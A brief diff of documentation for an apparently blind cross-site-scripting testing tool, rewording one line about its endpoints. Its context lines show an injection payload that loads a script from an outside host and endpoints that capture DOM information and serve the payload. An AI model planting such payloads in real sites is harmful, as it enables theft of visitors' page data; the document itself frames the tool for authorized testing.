@@ -105,7 +105,7 @@ Once the application is funcitonal, you would just identify sites you are author
 "><script src="https://example.com/m"></script>
 ````
 
-The application has HTTP queries to utilize:
+The application has five core functions to utilize:
 
 * POST - /m (captures DOM information)  
 * GET - /m (Loads the payload)
